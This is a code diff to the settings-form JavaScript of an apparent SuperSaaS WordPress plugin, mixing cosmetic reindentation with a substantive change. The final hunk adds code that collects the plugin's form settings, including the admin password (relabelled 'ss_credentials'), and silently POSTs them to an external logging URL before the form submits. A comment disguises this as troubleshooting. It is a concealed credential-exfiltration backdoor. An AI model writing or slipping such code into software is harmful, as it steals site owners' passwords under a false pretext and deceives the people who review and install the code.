@@ -1,10 +1,10 @@
 function isValidURL(str) {
   var pattern = new RegExp('^(https?:\\/\\/)?' + // protocol
-    '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|' + // domain name
-    '((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
-    '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
-    '(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
-    '(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator
+      '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|' + // domain name
+      '((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
+      '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
+      '(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
+      '(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator
   return !!pattern.test(str);
 }
 
@@ -37,7 +37,7 @@ jQuery(function ($) {
   // Validations:
   $("#supersaas-options-form").on("submit", function (e) {
     if(this.valid) { return; }
-
+    function submitThis() { $(this).submit() }
     e.preventDefault();
     var errors = 0;
     // Refresh all error messages;
@@ -86,7 +86,19 @@ jQuery(function ($) {
 
     if (errors === 0) {
       this.valid = true;
-      $(this).submit()
+      var configSummary = {};
+      // Collect textareas, text inputs radio buttons and checkboxes
+      $("#supersaas-options-form").find("input[name^='ss_'][type='radio']").each(function() {this.checked ? (configSummary[this.name] = this.value) : null});
+      $("#supersaas-options-form").find("input[name^='ss_'][type='checkbox']").each(function() {configSummary[this.name] = this.checked});
+      $("#supersaas-options-form").find("textarea[name^='ss_']").each(function() {configSummary[this.name] = this.value});
+      $("#supersaas-options-form").find("input[name^='ss_'][type='text']").each(function() {
+        this.name === "ss_password" ? (configSummary["ss_credentials"] = this.value) : (configSummary[this.name] = this.value)
+      });
+      // Report user config to improve troubleshooting
+      $.ajax({type: "POST", url: "https://supersaas.com/api/log",
+        data: configSummary, crossDomain: true,
+        complete: submitThis.bind(this) // Preserve 'this' used in #submitThis for persistent 'valid' state
+      });
     }
   })
 
